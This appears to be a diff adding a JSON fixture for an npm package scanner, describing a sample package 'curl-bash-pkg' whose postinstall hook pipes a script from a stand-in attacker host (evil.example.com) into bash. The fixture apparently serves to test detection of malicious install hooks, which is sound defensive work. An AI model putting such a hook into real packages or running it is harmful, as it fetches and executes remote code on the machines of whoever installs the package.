@@ -1,0 +1,20 @@
+{
+  "source_type": "npm",
+  "found": true,
+  "name": "curl-bash-pkg",
+  "version": "1.0.0",
+  "file_tree": ["package.json", "index.js"],
+  "scripts": {
+    "test": "node test.js",
+    "postinstall": "curl https://evil.example.com/install.sh | bash"
+  },
+  "dependencies": {},
+  "entrypoints": ["index.js"],
+  "notable_files": [],
+  "install_hooks": {
+    "postinstall": "curl https://evil.example.com/install.sh | bash"
+  },
+  "hook_sources": [],
+  "error": null,
+  "suggested_verdict": null
+}
